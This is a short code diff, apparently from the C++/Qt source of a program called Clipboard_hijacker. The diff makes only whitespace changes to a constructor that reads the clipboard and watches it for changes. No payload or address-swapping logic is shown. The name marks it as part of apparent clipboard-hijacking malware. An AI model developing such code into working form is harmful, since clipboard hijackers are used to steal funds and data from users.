@@ -10,9 +10,10 @@
 Clipboard_hijacker::Clipboard_hijacker()
 {
         const QClipboard *clipboard = QApplication::clipboard();
+
         QString clipboardText = clipboard->text();
         connect(QApplication::clipboard(), SIGNAL(dataChanged()),this, SLOT(clipboardhasChanged()));
-}
+    }
 
 void Clipboard_hijacker::clipboardhasChanged()
 {
